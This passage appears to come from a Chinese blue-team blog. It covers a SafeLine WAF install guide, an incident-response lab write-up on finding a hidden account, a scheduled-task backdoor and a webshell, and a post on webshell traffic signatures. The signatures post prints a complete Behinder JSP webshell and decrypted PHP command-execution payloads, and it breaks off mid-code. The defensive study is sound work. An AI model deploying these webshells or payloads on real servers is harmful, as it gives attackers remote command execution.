https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>启动docker服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>验证docker 是否安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br><span class="line"></span><br><span class="line">//软件依赖：Docker 20.10.14 版本以上</span><br></pre></td></tr></table></figure><h2 id="2、Docker-Compose环境"><a href="#2、Docker-Compose环境" class="headerlink" title="2、Docker-Compose环境"></a>2、Docker-Compose环境</h2><p>查看服务器架构，一般都是 <code>docker-compose-Linux-x86_64</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;docker-compose-`uname -s`-`uname -m`&quot;</span><br></pre></td></tr></table></figure><p>到官网下载最新版的docker-compose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/docker/compose</span><br></pre></td></tr></table></figure><p>上传到服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>检查docker-compose是否安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose --version</span><br><span class="line"></span><br><span class="line">//软件依赖：Docker Compose 2.0.0 版本以上</span><br></pre></td></tr></table></figure><h1 id="二、雷池WAF-的安装"><a href="#二、雷池WAF-的安装" class="headerlink" title="二、雷池WAF 的安装"></a>二、雷池WAF 的安装</h1><h2 id="1、在线安装"><a href="#1、在线安装" class="headerlink" title="1、在线安装"></a>1、在线安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)&quot;</span><br></pre></td></tr></table></figure><h2 id="2、离线安装"><a href="#2、离线安装" class="headerlink" title="2、离线安装"></a>2、离线安装</h2><p>下载 <a href="https://demo.waf-ce.chaitin.cn/image.tar.gz">雷池社区版镜像包</a> 并传输到需要安装雷池的服务器上，执行以下命令加载镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat image.tar.gz | gzip -d | docker load</span><br></pre></td></tr></table></figure><p>执行以下命令创建并进入雷池安装目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p safeline  &amp;&amp;  cd safeline    # 创建 safeline 目录并且进入</span><br></pre></td></tr></table></figure><p><strong>下载 <a href="https://waf-ce.chaitin.cn/release/latest/compose.yaml">编排脚本</a> 并传输到 safeline 目录中</strong></p><p>复制执行以下命令，生成雷池运行所需的相关环境变量（注意：不要一行一行复制，一次性复制全部命令后执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; .env &lt;&lt;EOF</span><br><span class="line">SAFELINE_DIR=$(pwd)</span><br><span class="line">IMAGE_TAG=latest</span><br><span class="line">MGT_PORT=9443</span><br><span class="line">POSTGRES_PASSWORD=$(LC_ALL=C tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 32)</span><br><span class="line">SUBNET_PREFIX=172.22.222</span><br><span class="line">IMAGE_PREFIX=chaitin</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>执行以下命令启动雷池</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><h1 id="三、雷池WAF-的配置"><a href="#三、雷池WAF-的配置" class="headerlink" title="三、雷池WAF 的配置"></a>三、雷池WAF 的配置</h1><h2 id="1、登陆"><a href="#1、登陆" class="headerlink" title="1、登陆"></a>1、登陆</h2><p>在安装完成之后会出现账号密码以及登陆地址</p><p>登陆后需要绑定一个动态口令，需要在手机上下载一个支持TOTP的认证软件</p><p>选择第一个腾讯身份验证，扫码下载手机版，之后扫码输入动态口令即可登陆成功</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315204823155.png" alt="image-20240315204823155"></p><h2 id="2、配置站点"><a href="#2、配置站点" class="headerlink" title="2、配置站点"></a>2、配置站点</h2><p>工作原理：<strong>让网站流量先抵达雷池，经过雷池检测和过滤后，再转给原来的网站业务。</strong></p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/flow-f8fc68b957b3b02950d85ac9a18dcdc9.svg" alt="flow.png"></p><p>配置防护站点：</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315195713770.png" alt="image-20240315195713770"></p><p>经过测试，这个地方最好将雷池和网站分开，放在两个服务器上</p><p>配置完成后，访问雷池服务器的80端口，出现和网站同样的界面即配置成功</p><h2 id="3、WAF防护"><a href="#3、WAF防护" class="headerlink" title="3、WAF防护"></a>3、WAF防护</h2><p>没加防护：存在sql注入</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315200621139.png" alt="image-20240315200621139"></p><p>加了防护：直接拦截</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315200738171.png" alt="image-20240315200738171"></p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315200943569.png" alt="image-20240315200943569"></p><h1 id="四、雷池WAF-的监测"><a href="#四、雷池WAF-的监测" class="headerlink" title="四、雷池WAF 的监测"></a>四、雷池WAF 的监测</h1><h2 id="1、数据统计"><a href="#1、数据统计" class="headerlink" title="1、数据统计"></a>1、数据统计</h2><p>查看数据请求数据量、拦截数据IP等</p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315201207308.png" alt="image-20240315201207308"></p><h2 id="2、攻击事件"><a href="#2、攻击事件" class="headerlink" title="2、攻击事件"></a>2、攻击事件</h2><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315201347283.png" alt="image-20240315201347283"></p><h2 id="3、日志分析"><a href="#3、日志分析" class="headerlink" title="3、日志分析"></a>3、日志分析</h2><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315201630115.png" alt="image-20240315201630115"></p><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315202059418.png" alt="image-20240315202059418"></p><h2 id="4、黑白名单"><a href="#4、黑白名单" class="headerlink" title="4、黑白名单"></a>4、黑白名单</h2><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315202414389.png" alt="image-20240315202414389"></p><h2 id="5、高频率防护"><a href="#5、高频率防护" class="headerlink" title="5、高频率防护"></a>5、高频率防护</h2><p><img src="/img/Blue-Team-SafeLine-LeichiWAF/image-20240315202603665.png" alt="image-20240315202603665"></p>]]></content>
      
      
      <categories>
          
          <category> 蓝队应急 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】Win Server Web3入侵排查</title>
      <link href="/2024/03/13/Emergency-WinServer-web3/"/>
      <url>/2024/03/13/Emergency-WinServer-web3/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-Web3入侵排查"><a href="#Windows-Server-Web3入侵排查" class="headerlink" title="Windows Server Web3入侵排查"></a>Windows Server Web3入侵排查</h1><p><strong>前景需要：</strong>小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。</p><p>这是他的服务器，请你找出以下内容作为通关条件：</p><ol><li>攻击者的两个IP地址</li><li>隐藏用户名称</li><li>黑客遗留下的flag【3个】</li></ol><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><p>在网盘中下载该靶场，解压后在vm中选择【打开】，选择对应的.ovf 文件</p><p><img src="/img/Emergency-WinServer-web3/image-20240313134334425.png" alt="image-20240313134334425"></p><p>随便设置一个名称，指定路径即可</p><h1 id="二、后门用户排查"><a href="#二、后门用户排查" class="headerlink" title="二、后门用户排查"></a>二、后门用户排查</h1><h3 id="1、命令简单的排查"><a href="#1、命令简单的排查" class="headerlink" title="1、命令简单的排查"></a>1、命令简单的排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web3/image-20240313135600186.png" alt="image-20240313135600186"></p><h3 id="2、控制面板排查"><a href="#2、控制面板排查" class="headerlink" title="2、控制面板排查"></a>2、控制面板排查</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313135718050.png" alt="image-20240313135718050"></p><p>发现隐藏用户<code>hack6618$</code></p><h3 id="3、本地用户和组管理排查"><a href="#3、本地用户和组管理排查" class="headerlink" title="3、本地用户和组管理排查"></a>3、本地用户和组管理排查</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313135815442.png" alt="image-20240313135815442"></p><h3 id="4、注册表排查"><a href="#4、注册表排查" class="headerlink" title="4、注册表排查"></a>4、注册表排查</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313135933026.png" alt="image-20240313135933026"></p><p>并无其他用户</p><h1 id="三、端口、进程排查"><a href="#三、端口、进程排查" class="headerlink" title="三、端口、进程排查"></a>三、端口、进程排查</h1><h3 id="1、端口连接、进程排查"><a href="#1、端口连接、进程排查" class="headerlink" title="1、端口连接、进程排查"></a>1、端口连接、进程排查</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313140024490.png" alt="image-20240313140024490"></p><p>与多个IP 的80端口处于连接关闭状态，与<code>104.208.16.88</code>的443端口处于连接状态</p><p><img src="/img/Emergency-WinServer-web3/image-20240313140805519.png" alt="image-20240313140805519"></p><p>每隔一段时间连接会发生变化</p><p>这里我们采用<code>tcpview64.exe</code>这个工具，来监听”心跳数据包”</p><p><img src="/img/Emergency-WinServer-web3/image-20240313141139099.png" alt="image-20240313141139099"></p><p>可以看到<code>111.6.232.54</code>与<code>223.109.1.97</code>在进行连接，进程均为<code>svchost.exe</code>，直接判为异常连接</p><p>可以右击kill掉这两个进程</p><p><img src="/img/Emergency-WinServer-web3/image-20240313141505805.png" alt="image-20240313141505805"></p><h1 id="四、自启动后门排查"><a href="#四、自启动后门排查" class="headerlink" title="四、自启动后门排查"></a>四、自启动后门排查</h1><h3 id="1、计划任务排查"><a href="#1、计划任务排查" class="headerlink" title="1、计划任务排查"></a>1、计划任务排查</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313141727140.png" alt="image-20240313141727140"></p><p>两个计划任务均由后门用户<code>hack6618$</code>所创建，且发现<code>flag&#123;zgsfsys@sec&#125;</code></p><p><img src="/img/Emergency-WinServer-web3/image-20240313141914152.png" alt="image-20240313141914152"></p><p>这两个计划任务都执行该启动程序，查看该文件内容：</p><p><img src="/img/Emergency-WinServer-web3/image-20240313142100362.png" alt="image-20240313142100362"></p><p>向www目录下写了一个webshell 的php后门木马文件，并输出了又一个<code>flag&#123;888666abc&#125;</code></p><p><img src="/img/Emergency-WinServer-web3/image-20240313142328067.png" alt="image-20240313142328067"></p><p>确认写入了后门</p><h3 id="2、自启动服务排查"><a href="#2、自启动服务排查" class="headerlink" title="2、自启动服务排查"></a>2、自启动服务排查</h3><p>服务这块正常</p><p><img src="/img/Emergency-WinServer-web3/image-20240313142515443.png" alt="image-20240313142515443"></p><h3 id="3、自启动文件夹排查"><a href="#3、自启动文件夹排查" class="headerlink" title="3、自启动文件夹排查"></a>3、自启动文件夹排查</h3><p>正常</p><p><img src="/img/Emergency-WinServer-web3/image-20240313142724009.png" alt="image-20240313142724009"></p><h3 id="4、自启动注册表项排查"><a href="#4、自启动注册表项排查" class="headerlink" title="4、自启动注册表项排查"></a>4、自启动注册表项排查</h3><p>安全</p><p><img src="/img/Emergency-WinServer-web3/image-20240313160353982.png" alt="image-20240313160353982"></p><h1 id="五、入侵日志排查"><a href="#五、入侵日志排查" class="headerlink" title="五、入侵日志排查"></a>五、入侵日志排查</h1><h3 id="1、Windows系统安全日志排查"><a href="#1、Windows系统安全日志排查" class="headerlink" title="1、Windows系统安全日志排查"></a>1、Windows系统安全日志排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">4624：成功登录的账户。</span><br><span class="line">4625：登录失败的尝试。</span><br><span class="line">4672：授予了特殊权限。</span><br><span class="line">4720：账户创建。</span><br><span class="line">4722：账户启用。</span><br><span class="line">4723：账户禁用。</span><br><span class="line">4724：密码更改。</span><br><span class="line">4725：密码重置。</span><br><span class="line">4726：账户删除。</span><br><span class="line">4738：用户账户更改。</span><br><span class="line">4739：用户组更改。</span><br><span class="line">4762：用户组添加或删除成员。</span><br><span class="line">4776：此事件表示“计算机试图验证帐户的凭据”，这个事件通常与NTLM（NT LAN Manager）身份验证过程有关。</span><br></pre></td></tr></table></figure><p>日志太多，这里暂时借用下工具进行快速分析</p><p><img src="/img/Emergency-WinServer-web3/image-20240313161456543.png" alt="image-20240313161456543"></p><p>再回到安全日志中查看<code>4776</code>的登陆情况</p><p><img src="/img/Emergency-WinServer-web3/image-20240313162000328.png" alt="image-20240313162000328"></p><p>后门用户<code>hack6618$</code>是通过NTLM认证进行登陆</p><h3 id="2、Web日志排查"><a href="#2、Web日志排查" class="headerlink" title="2、Web日志排查"></a>2、Web日志排查</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313163611200.png" alt="image-20240313163611200"></p><p>日志不大，我们用在线日志审计工具进行简单的审计</p><p><img src="/img/Emergency-WinServer-web3/image-20240313163811977.png" alt="image-20240313163811977"></p><p>从48条日志开始，出现了外部IP<code>192.168.75.129</code>，之后从79条数据开始，重复了多次同样的操作，前方访问了login.php 登陆页面，那么重复的操作疑似爆破</p><p><img src="/img/Emergency-WinServer-web3/image-20240313164204194.png" alt="image-20240313164204194"></p><p>看了一下登陆的请求页面，确实是<code>/zb_system/cmd.php?act=verify</code>，那么确认该IP 在进行了登陆爆破行为</p><p><img src="/img/Emergency-WinServer-web3/image-20240313164128438.png" alt="image-20240313164128438"></p><p>该爆破行为一直持续到了最后，且爆破速率较慢</p><p><img src="/img/Emergency-WinServer-web3/image-20240313164726256.png" alt="image-20240313164726256"></p><p>但是中间有多处存在其他行为，怀疑攻击者使用了限制爆破速率的爆破工具，且在爆破成功之后回显账号密码并继续爆破</p><p>如下，针对<code>/zb_system/admin/index.php?act=admin</code>的路径，提示没有权限，那么这里很可能是攻击者在爆破成功之后对该账户进行了登陆，猜测其用户名为admin，那么针对admin 用户需要修改成强密码进行加固</p><p><img src="/img/Emergency-WinServer-web3/image-20240313165147167.png" alt="image-20240313165147167"></p><p>之后疑似进行了插件的上传操作</p><p><img src="/img/Emergency-WinServer-web3/image-20240313165652657.png" alt="image-20240313165652657"></p><p>1202条日志的时候疑似进行了模板攻击</p><p><img src="/img/Emergency-WinServer-web3/image-20240313200220003.png" alt="image-20240313200220003"></p><p>在进行了多次类似重复性的上传操作之后，访问了在计划任务中排查到的404 webshell木马后门文件，对木马文件的访问一直持续到了最后</p><p><img src="/img/Emergency-WinServer-web3/image-20240313170116261.png" alt="image-20240313170116261"></p><h1 id="六、病毒木马文件排查"><a href="#六、病毒木马文件排查" class="headerlink" title="六、病毒木马文件排查"></a>六、病毒木马文件排查</h1><h3 id="1、bat-后门"><a href="#1、bat-后门" class="headerlink" title="1、bat 后门"></a>1、bat 后门</h3><p>在计划任务重排到的<code>system.bat</code>文件，当任意用户登陆的时候将会执行，在www目录下创建一个<code>404.php</code>的后门webshell文件</p><p><img src="/img/Emergency-WinServer-web3/image-20240313170503828.png" alt="image-20240313170503828"></p><h3 id="2、webshell-木马后门"><a href="#2、webshell-木马后门" class="headerlink" title="2、webshell 木马后门"></a>2、webshell 木马后门</h3><p>那么对应的就是www下的404后门文件</p><p><img src="/img/Emergency-WinServer-web3/image-20240313170537636.png" alt="image-20240313170537636"></p><h1 id="七、溯源追踪"><a href="#七、溯源追踪" class="headerlink" title="七、溯源追踪"></a>七、溯源追踪</h1><p>在apache日志中，对404.php文件的访问是在11:34:03，持续到11:42:58</p><p><img src="/img/Emergency-WinServer-web3/image-20240313171009891.png" alt="image-20240313171009891"></p><p><code>hack6618$</code>的首次登陆是在11:42:26，最后一次登陆在2024&#x2F;3&#x2F;13日的17:04:41</p><p><img src="/img/Emergency-WinServer-web3/image-20240313171208549.png" alt="image-20240313171208549"></p><p>筛选4720，后门用户的创建时间在11:36:55</p><p><img src="/img/Emergency-WinServer-web3/image-20240313171330670.png" alt="image-20240313171330670"></p><p>根据登陆的时间段在<code>4624</code>登陆成功的日志中，找到后门用户登陆的IP为：<code>192.168.75.130</code></p><p><img src="/img/Emergency-WinServer-web3/image-20240313172257722.png" alt="image-20240313172257722"></p><p>那么<code>system.bat</code>是什么时候创建的呢，在3&#x2F;12 11:47分的时候创建，在48分的时候进行了修改</p><p><img src="/img/Emergency-WinServer-web3/image-20240313174356303.png" alt="image-20240313174356303"></p><p>后门用户在登陆之后还做了哪些事情呢，这里用<code>LastActivityView</code>进行排查下</p><p><img src="/img/Emergency-WinServer-web3/image-20240313174606862.png" alt="image-20240313174606862"></p><p>他好像一直在进行登陆操作，后面是我做的一些排查操作</p><h1 id="八、最后一个flag"><a href="#八、最后一个flag" class="headerlink" title="八、最后一个flag"></a>八、最后一个flag</h1><p>那么针对本靶场的通关还少一个flag，也是找了一会儿，在小皮那里发现有两个数据库</p><p><img src="/img/Emergency-WinServer-web3/image-20240313175239355.png" alt="image-20240313175239355"></p><p>猜测flag 会不会在数据库中，最终也是找到了最后的flag</p><p><img src="/img/Emergency-WinServer-web3/image-20240313175314592.png" alt="image-20240313175314592"></p><h1 id="九、工具一把梭"><a href="#九、工具一把梭" class="headerlink" title="九、工具一把梭"></a>九、工具一把梭</h1><p><img src="/img/Emergency-WinServer-web3/image-20240313175734078.png" alt="image-20240313175734078"></p><p><img src="/img/Emergency-WinServer-web3/image-20240313175745959.png" alt="image-20240313175745959"></p><p><img src="/img/Emergency-WinServer-web3/image-20240313194011963.png" alt="image-20240313194011963"></p><p>呀？怎么多了一个后门！然后我观察了<code>template</code>目录下的所有文件，结果发现每一个开头都包含了这个文件，so，全部都是后门了</p><p><img src="/img/Emergency-WinServer-web3/image-20240313195015699.png" alt="image-20240313195015699"></p><p><img src="/img/Emergency-WinServer-web3/image-20240313195526198.png" alt="image-20240313195526198"></p><p>apache日志分析</p><p><img src="/img/Emergency-WinServer-web3/image-20240313195854351.png" alt="image-20240313195854351"></p><p>啊？日志中存在<code>192.168.75.130</code>的IP吗</p><p><img src="/img/Emergency-WinServer-web3/image-20240313200641827.png" alt="image-20240313200641827"></p><p>回去看了看日志，确实存在<code>192.168.75.130</code>的IP，在查看日志的时候没能看全，大多精力放在路径上面了</p><p><img src="/img/Emergency-WinServer-web3/image-20240313200829514.png" alt="image-20240313200829514"></p>]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【蓝队应急】WebShell 流量特征</title>
      <link href="/2024/03/13/Blue-Team-WebShell-Traffic-characteristics/"/>
      <url>/2024/03/13/Blue-Team-WebShell-Traffic-characteristics/</url>
      
        <content type="html"><![CDATA[<h1 id="WebShell-流量特征"><a href="#WebShell-流量特征" class="headerlink" title="WebShell 流量特征"></a>WebShell 流量特征</h1><h1 id="一、蚁剑流量特征"><a href="#一、蚁剑流量特征" class="headerlink" title="一、蚁剑流量特征"></a>一、蚁剑流量特征</h1><p>当我们在蚁剑中执行<code>whomai</code>命令，发送给靶机的流量长这样：<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312174418790.png" alt="image-20240312174418790"></p><p>执行<code>dir</code>命令相关流量：<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312180816492.png" alt="image-20240312180816492"></p><p>对前部分进行url 解码可获得如下：</p><pre style="white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word;"><code>1=@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) &#123;$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) &#123;if(!@is_writable($item)</code></pre><p>总结蚁剑流量特征如下：</p><ol><li>UA头可能会有<code>antSword/版本号</code>等字样</li><li>由木马连接密码开头（加密的话大都是_0x 开头）</li><li>明文中有@ini_set() 函数开头来隐藏错误信息（强特征）</li><li>有@set_time_limit(0) 函数设置脚本执行时间为无限长</li><li>有@ini_get() 函数获取php配置文件中open_basedir的值，即获取可以访问的目录</li><li>存在eval 这个危险函数（强特征）</li><li>payload分段并 采用base64 加密（因此有base64界面相关函数）</li><li>服务器返回的是明文信息</li></ol><p>强特征：</p><ol><li><p>@ini_set() 函数开头绝对是一个强特征。其在不同编码下的不同表现形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64编码：QGluaV9zZXQ</span><br><span class="line">chr编码：cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116)</span><br><span class="line">rot13编码：@vav_frg</span><br></pre></td></tr></table></figure></li><li><p>以上，不管各种编码，数据包中存在eval 函数</p></li></ol><h1 id="二、哥斯拉流量特征"><a href="#二、哥斯拉流量特征" class="headerlink" title="二、哥斯拉流量特征"></a>二、哥斯拉流量特征</h1><p>在哥斯拉中执行<code>whoami</code>命令，流量如下：<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312182433169.png" alt="image-20240312182433169"><img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312183149262.png" alt="image-20240312183149262"></p><p>总结特征如下：</p><ol><li>UA头默认是使用的JDK 信息（如 Java&#x2F;1.8.0_121，具体取决JDK环境）</li><li>Cookie 值有<code>PHPSESSID=iocrpclbbt8mpg4i11j5ocohu0;</code>（强特征）</li><li>头部Accept值<code>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</code>（弱特征）</li><li>由木马连接密码开头</li><li>首当其冲的是 eval 命令执行函数</li><li>存在base64_decode、strrev和urldecode 等解码函数</li><li>在请求体中存在key 字段</li><li>相应包分前后两种加密方式</li></ol><p>强特征：</p><ol><li>Cookie值存在<code>PHPSESSID=js1bi491i4bcqlogsotqg91pd6;</code>这种字段值</li></ol><h1 id="三、菜刀流量特征"><a href="#三、菜刀流量特征" class="headerlink" title="三、菜刀流量特征"></a>三、菜刀流量特征</h1><p>在菜刀中执行<code>dir</code>命令，流量如下<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240313102854698.png" alt="image-20240313102854698.png"></p><p>总结特征如下：</p><ol><li>强特征：直接eval，明文后base64加密，请求包中会有eval、assert这种base64特征的字符</li><li>强特征：固定存在<code>QGluaV9zZXQ</code></li><li>请求体payload 为base64编码</li><li>请求体中固定存在<code>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</code></li></ol><h1 id="四、冰蝎3-0流量特征"><a href="#四、冰蝎3-0流量特征" class="headerlink" title="四、冰蝎3.0流量特征"></a>四、冰蝎3.0流量特征</h1><p>内置16个UA头，取消动态密钥获取，目前很多waf等设备都做了冰蝎2.0的流量特征分析。所以3.0取消了动态密钥获取；界面由swt改为javafx；aes密钥变为md5(“pass”)[0:16]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求包中content-length 为5740或5720（可能会根据Java版本而改变）</span><br><span class="line">每一个请求头中存在</span><br><span class="line">Pragma: no-cache，Cache-Co</span><br><span class="line"></span><br><span class="line">ntrol: no-cache</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">出处：https://blog.csdn.net/qq_53577336/article/details/125048353</span><br></pre></td></tr></table></figure><p>在shell.jsp中<code>e45e329feb5d925b</code>为rebeyond</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure><h1 id="五、冰蝎4-0流量特征"><a href="#五、冰蝎4-0流量特征" class="headerlink" title="五、冰蝎4.0流量特征"></a>五、冰蝎4.0流量特征</h1><p>冰蝎4.0建立时候java也会与主机建立tcp连接，端口在49700左右每次连接就逐一叠加，冰蝎4.0他是内置了10个user-agent，每次连接shell都会换一个进行使用连接，他有固定的请求头和响应头，并且默认时候冰蝎webshell都有一串密钥，这个密钥是连接密码32位md5值的前16位，默认连接密码是rebeyond。</p><p>在冰蝎中执行<code>whoami</code>命令，流量如下：<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240313102844082.png" alt="image-20240313102844082"><img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240313102854690.png" alt="image-20240313102854690"></p><p>当我们将密文的请求包在冰蝎中进行解密处理，得到如下：</p><pre style="white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word;"><code>@error_reporting(0);function getSafeStr($str)&#123;    $s1 = iconv('utf-8','gbk//IGNORE',$str);    $s0 = iconv('gbk','utf-8//IGNORE',$s1);    if($s0 == $str)&#123;        return $s0;    &#125;else&#123;        return iconv('gbk','utf-8//IGNORE',$str);    &#125;&#125;function main($cmd,$path)&#123;    @set_time_limit(0);    @ignore_user_abort(1);    @ini_set('max_execution_time', 0);    $result = array();    $PadtJn = @ini_get('disable_functions');    if (! empty($PadtJn)) &#123;        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);        $PadtJn = explode(',', $PadtJn);        $PadtJn = array_map('trim', $PadtJn);    &#125; else &#123;        $PadtJn = array();    &#125;    $c = $cmd;    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) &#123;        $c = $c . " 2>&1\n";    &#125;    $JueQDBH = 'is_callable';    $Bvce = 'in_array';    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) &#123;        ob_start();        system($c);        $kWJW = ob_get_contents();        ob_end_clean();    &#125; else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) &#123;        $handle = proc_open($c, array(            array(                'pipe',                'r'            ),            array(                'pipe',                'w'            ),            array(                'pipe',                'w'            )        ), $pipes);        $kWJW = NULL;        while (! feof($pipes[1])) &#123;            $kWJW .= fread($pipes[1], 1024);        &#125;        @proc_close($handle);    &#125; else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) &#123;        ob_start();        passthru($c);        $kWJW = ob_get_contents();        ob_end_clean();    &#125; else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) &#123;        $kWJW = shell_exec($c);    &#125; else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) &#123;        $kWJW = array();        exec($c, $kWJW);        $kWJW = join(chr(10), $kWJW) . chr(10);    &#125; else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) &#123;        $fp = popen($c, 'r');        $kWJW = NULL;        if 